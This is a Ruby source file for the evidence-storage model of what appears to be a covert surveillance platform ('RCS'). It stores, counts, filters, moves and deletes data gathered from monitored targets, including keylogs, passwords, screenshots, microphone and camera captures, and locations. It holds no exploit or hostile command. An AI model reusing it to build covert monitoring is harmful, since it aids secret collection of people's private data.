require 'mongoid'
require 'rcs-common/keywords'
require_relative '../shard'

#module RCS
#module DB


module Evidence
  extend RCS::Tracer

  TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
           "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]

  STAT_EXCLUSION = ['filesystem', 'info', 'command', 'ip']

  def self.included(base)
    base.field :da, type: Integer                      # date acquired
    base.field :dr, type: Integer                      # date received
    base.field :type, type: String
    base.field :rel, type: Integer, default: 0         # relevance (tag)
    base.field :blo, type: Boolean, default: false     # blotter (report)
    base.field :note, type: String
    base.field :aid, type: String                      # agent BSON_ID
    base.field :data, type: Hash
    base.field :kw, type: Array, default: []           # keywords for full text search

    # store_in collection: Evidence.collection_name('#{target}')
    base.store_in collection: -> { self.collection_name }

    base.after_create :create_callback
    base.before_destroy :destroy_callback

    base.index({type: 1}, {background: true})
    base.index({da: 1}, {background: true})
    base.index({dr: 1}, {background: true})
    base.index({aid: 1}, {background: true})
    base.index({rel: 1}, {background: true})
    base.index({blo: 1}, {background: true})
    base.index({kw: 1}, {background: true})

    base.index({'data.position' => "2dsphere"}, {background: true})

    base.shard_key :type, :da, :aid
    base.validates_presence_of :type, :da, :aid

    base.scope :positions, base.where(type: 'position')
    base.scope :stats_relevant, base.not_in(:type => STAT_EXCLUSION)

    base.extend ClassMethods
  end

  def create_callback
    return if STAT_EXCLUSION.include? self.type
    agent = Item.find self.aid
    agent.stat.inc(:"evidence.#{self.type}", 1)
    agent.stat.inc(:"dashboard.#{self.type}", 1)
    agent.stat.inc(:size, self.data.to_s.length)
    agent.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
    # update the target of this agent
    target = agent.get_parent
    target.stat.inc(:"evidence.#{self.type}", 1)
    target.stat.inc(:"dashboard.#{self.type}", 1)
    target.stat.inc(:size, self.data.to_s.length)
    target.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
    # update the operation of this agent
    operation = target.get_parent
    operation.stat.inc(:size, self.data.to_s.length)
    operation.stat.inc(:grid_size, self.data[:_grid_size]) unless self.data[:_grid].nil?
  rescue Exception => e
    trace :error, "Cannot update statisting while creating evidence #{e.message}"
  end

  def destroy_callback
    unless self.data['_grid'].nil?
      RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) rescue nil
    end

    return if STAT_EXCLUSION.include? self.type
    agent = Item.find self.aid
    return unless agent
    agent.stat.inc(:"evidence.#{self.type}", -1)
    agent.stat.inc(:size, -self.data.to_s.length)
    agent.stat.inc(:grid_size, -self.data['_grid_size']) unless self.data['_grid'].nil?
    # update the target of this agent
    target = agent.get_parent
    target.stat.inc(:"evidence.#{self.type}", -1)
    target.stat.inc(:size, -self.data.to_s.length)
    target.stat.inc(:grid_size, -self.data[:_grid_size]) unless self.data[:_grid].nil?
    # update the operation of this agent
    operation = target.get_parent
    operation.stat.inc(:size, -self.data.to_s.length)
    operation.stat.inc(:grid_size, -self.data[:_grid_size]) unless self.data[:_grid].nil?
  rescue Exception => e
    trace :error, "Cannot update statisting while deleting evidence #{e.message}"
  end

  def target
    @target ||= Item.find(target_id)
  end

  def agent
    @agent ||= Item.find(aid)
  end

  def target_id
    self.class.instance_variable_get '@target_id'
  end

  def may_have_readable_text_or_face?
    type == 'screenshot' or (type == 'file' and data[:type] == :capture) or type == 'camera'
  end

  def translatable?
    ['keylog', 'chat', 'clipboard', 'message'].include?(type)
  end

  def intelligence_relevant?
    ['addressbook', 'password', 'position'].include?(type)
  end

  def enqueue
    if LicenseManager.instance.check(:connectors)
      return if RCS::DB::ConnectorManager.process_evidence(target, self) == :discard
    end

    # check if there are matching alerts for this evidence
    RCS::DB::Alerting.new_evidence(self)

    # add to the ocr processor queue
    if LicenseManager.instance.check(:ocr) and may_have_readable_text_or_face?
      OCRQueue.add(target.id, id)
    end

    # add to the translation queue
    if LicenseManager.instance.check(:translation) and translatable?
      TransQueue.add(target.id, id)
      data[:tr] = "TRANS_QUEUED"
      save
    end

    # add to the aggregator queue
    if LicenseManager.instance.check(:correlation)
      add_to_aggregator_queue
    end

    WatchedItem.matching(agent, target, target.get_parent) do |item, user_ids|
      stats = item.stat.attributes.reject { |key| !%w[evidence dashboard].include?(key) }

      if item._kind == 'agent'
        stats[:last_sync] = item.stat.last_sync
        stats[:last_sync_status] = item.stat.last_sync_status
      end

      message = {item: item, rcpts: user_ids, stats: stats, suppress: {start: Time.now.getutc.to_f, key: item.id}}
      RCS::DB::PushManager.instance.notify('dashboard', message)
    end

    add_to_intelligence_queue
  end

  def add_to_intelligence_queue
    IntelligenceQueue.add(target_id, id, :evidence) if intelligence_relevant?
  end

  def add_to_aggregator_queue
    AggregatorQueue.add(target_id, id, type)
  end

  def self.target(target)
    target_id = target.respond_to?(:id) ? target.id : target
    dynamic_classname = "Evidence#{target_id}"

    if const_defined? dynamic_classname
      const_get dynamic_classname
    else
      c = Class.new do
        extend RCS::Tracer
        include RCS::Tracer
        include Mongoid::Document
        include RCS::DB::Proximity
        include Evidence
      end
      c.instance_variable_set '@target_id', target_id
      const_set(dynamic_classname, c)
    end
  end

  module ClassMethods
    def collection_name
      raise "Missing target id. Maybe you're trying to instantiate Evidence without using Evidence#target." unless @target_id
      "evidence.#{@target_id}"
    end

    def create_collection
      # create the collection for the target's evidence and shard it
      db = RCS::DB::DB.instance.mongo_connection
      collection = db.collection self.collection.name
      # ensure indexes
      self.create_indexes
      # enable sharding only if not enabled
      RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1}) unless collection.stats['sharded']
    end

    # Count the number of all the evidences grouped by type.
    # Returns an hash like {"chat" => 3, "mic" => 0, ..., "position" => 42}
    def count_by_type(where={})
      match = where.merge(stats_relevant.selector)
      group = {_id: '$type', count: {'$sum' => 1}}
      project = { _id: 0, type: '$_id', count: 1}

      results = collection.aggregate([{'$match' => match}, {'$group' => group}, {'$project' => project}])
      results = results.inject({}) { |h, val| h[val['type']] = val['count']; h }

      defaults = TYPES.inject({}) { |h, type| h[type.to_s] = 0; h }
      defaults.merge!(results)
    end
  end

  def self.dynamic_new(target)
    target(target).new
  end

  def self.deep_copy(src, dst)
    dst.da = src.da
    dst.dr = src.dr
    dst.aid = src.aid.dup
    dst.type = src.type.dup
    dst.rel = src.rel
    dst.blo = src.blo
    dst.data = src.data.dup
    dst.note = src.note.dup unless src.note.nil?
    dst.kw = src.kw.dup unless src.kw.nil?
  end

  def self.report_filter(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.target(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    query = filtering.where(filter_hash).order_by([[:da, :asc]])

    return query
  end

  def self.report_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.target(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end

  def self.filtered_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.target(target[:_id]).stats_relevant
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end

  def self.common_filter(params)

    # filtering
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter' and params['filter'].is_a? String
    # must duplicate here since we delete the param later but we need to keep the parameter intact for
    # subsequent calls
    filter = params['filter'].dup if params.has_key? 'filter' and params['filter'].is_a? Hash

    # if not specified the filter on the date is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil? or filter['from'] == '24h'
    filter['from'] = Time.now.to_i - 7*86400 if filter['from'] == 'week'
    filter['from'] = Time.now.to_i - 30*86400 if filter['from'] == 'month'
    filter['from'] = Time.now.to_i if filter['from'] == 'now'

    filter['to'] = Time.now.to_i if filter['to'].nil?

    # to remove a filter set it to 0
    filter.delete('from') if filter['from'] == 0
    filter.delete('to') if filter['to'] == 0

    filter_hash = {}

    # filter by target
    target = Item.where({_id: filter.delete('target')}).first
    return nil if target.nil?

    # filter by agent
    filter_hash[:aid] = filter.delete('agent') if filter['agent']

    # default filter is on acquired
    date = filter.delete('date')
    date ||= 'da'
    date = date.to_sym

    # date filters must be treated separately
    filter_hash[date.gte] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'

    # custom filters for info
    if filter.has_key?('info')
      info = filter.delete('info')
      # backward compatibility
      info = [info].flatten.compact

      filter_for_keywords(info, filter_hash)
      filter_for_position(info, filter_hash)
    end

    # filter on note
    groups_of_words = filter.delete('note')
    # backward compatibility: a string may arrive (instead of an array)
    groups_of_words = [groups_of_words].flatten.compact
    # remove empty string from the array
    groups_of_words = groups_of_words.select { |string| !string.blank? }

    if !groups_of_words.empty?
      filter_hash['$or'] ||= []
      filter_hash['$or'].concat groups_of_words.map { |words| {'kw' => {'$all' => words.keywords}} }
      regexp = groups_of_words.map { |words| "(#{words})"}.join('|')
      filter_hash['note'] = /#{regexp}/i
    end

    return filter, filter_hash, target
  end

  # Check if the first string of the "info" filter is in the form of
  # field_1:value_1,field_2:value_2,...,field_x:value_y
  def self.filter_info_has_key_values? info
    regexp = /^([a-zA-Z]+:[^\,]+(\,|\,\s|$))+$/
    info.size == 1 && info.first =~ regexp
  end

  def self.each_filter_key_value string
    key_values = string.split(',')
    key_values.each do |kv|
      key, value = kv.split(':').map(&:strip)
      key.downcase!

      next if value.blank?
      # special case for email (the field is called "rcpt" but presented as "to")
      key = 'rcpt' if key == 'to'
      yield(key, value) if block_given?
    end
  end

  # If the info array contains a string like "lon:40,lat:10,r:34" than adds
  # a $near filter for the "data.position" attribute.
  def self.filter_for_position(info, filter_hash)
    return unless filter_info_has_key_values?(info)

    lat, lon, r = nil

    each_filter_key_value(info.first) do |k, v|
      lat = v if k == 'lat'
      lon = v if k == 'lon'
      r   = v if k == 'r'
    end

    return unless lat and lon

    filter_hash['geoNear_coordinates'] = [lon, lat].map(&:to_f)
    filter_hash['geoNear_accuracy'] = r.to_i if r
  end

  def self.filter_for_keywords(info, filter_hash)
    if filter_info_has_key_values?(info)
      each_filter_key_value(info.first) do |k, v|
        # special case for $near search
        next if %w[lat lon r].include?(k)

        filter_hash["data.#{k}"] = Regexp.new("#{v}", Regexp::IGNORECASE)
        # add the keyword search to cut the nscanned item
        filter_hash[:kw.all] ||= v.keywords
      end
    elsif !info.empty?
      # otherwise we use it for full text search with keywords
      groups_of_words = info.map { |words| words.strip.keywords }

      filter_hash['$or'] ||= []
      filter_hash['$or'].concat groups_of_words.map { |words| {'kw' => {'$all' => words}} }
    end
  end

  def self.offload_move_evidence(params)
    old_target = ::Item.find(params[:old_target_id])
    target = ::Item.find(params[:target_id])
    agent = ::Item.find(params[:agent_id])

    # moving an agent implies that all the evidence are moved to another target
    # we have to remove all the aggregates created from those evidence on the old target
    Aggregate.target(old_target[:_id]).destroy_all(aid: agent[:_id].to_s)

    evidences = Evidence.target(old_target[:_id]).where(:aid => agent[:_id])

    total = evidences.count
    chunk_size = 500
    trace :info, "Evidence Move: #{total} to be moved for agent #{agent.name} to target #{target.name}"

    # move the evidence in chunks to prevent cursor expiration on mongodb
    until evidences.count == 0 do

      evidences = Evidence.target(old_target[:_id]).where(:aid => agent[:_id]).limit(chunk_size)

      # copy the new evidence
      evidences.each do |old_ev|
        # deep copy the evidence from one collection to the other
        new_ev = Evidence.dynamic_new(target[:_id])
        Evidence.deep_copy(old_ev, new_ev)

        # move the binary content
        if old_ev.data['_grid']
          begin
            bin = RCS::DB::GridFS.get(old_ev.data['_grid'], old_target[:_id].to_s)
            new_ev.data['_grid'] = RCS::DB::GridFS.put(bin, {filename: agent[:_id].to_s}, target[:_id].to_s) unless bin.nil?
            new_ev.data['_grid_size'] = old_ev.data['_grid_size']
          rescue Exception => e
            trace :error, "Cannot get id #{old_target[:_id].to_s}:#{old_ev.data['_grid']} from grid: #{e.class} #{e.message}"
          end
        end

        # save the new one
        new_ev.save

        # add to the aggregator queue the evidence (we need to recalculate them in the new target)
        if LicenseManager.instance.check :correlation
          new_ev.add_to_aggregator_queue
        end

        new_ev.add_to_intelligence_queue if LicenseManager.instance.check(:intelligence)

        # delete the old one. NOTE CAREFULLY:
        # we use delete + explicit grid, since the callback in the destroy will fail
        # because the parent of aid in the evidence is already the new one
        old_ev.delete
        RCS::DB::GridFS.delete(old_ev.data['_grid'], old_target[:_id].to_s) unless old_ev.data['_grid'].nil?

        # yield for progress indication
        yield if block_given?
      end

      total = total - chunk_size
      trace :info, "Evidence Move: #{total} left to move for agent #{agent.name} to target #{target.name}" unless total < 0
    end

    # we moved aggregates, have to rebuild the summary
    if LicenseManager.instance.check :correlation
      Aggregate.target(old_target[:_id]).rebuild_summary
    end

    # recalculate stats
    old_target.restat
    old_target.get_parent.restat
    target.restat
    target.get_parent.restat

    trace :info, "Evidence Move: completed for #{agent.name}"
  end


  def self.offload_delete_evidence(params)

    conditions = {}

    target = ::Item.find(params['target'])

    if params['agent']
      agent = ::Item.find(params['agent'])
      conditions[:aid] = agent._id.to_s
    end

    conditions[:rel] = params['rel']

    date = params['date']
    date ||= 'da'
    date = date.to_sym
    conditions[date.gte] = params['from']
    conditions[date.lte] = params['to']

    trace :info, "Deleting evidence for target #{target.name} #{params}"

    Evidence.target(target._id.to_s).where(conditions).any_in(:rel => params['rel']).destroy_all

    trace :info, "Deleting evidence for target #{target.name} done."

    # recalculate the stats for each agent of this target
    agents = Item.agents.in(path: [target._id])
    agents.each {|a| a.restat }

    # recalculate for the target
    target.restat

    # recalculate for the operation
    target.get_parent.restat
  end
end

#end # ::DB
#end # ::RCS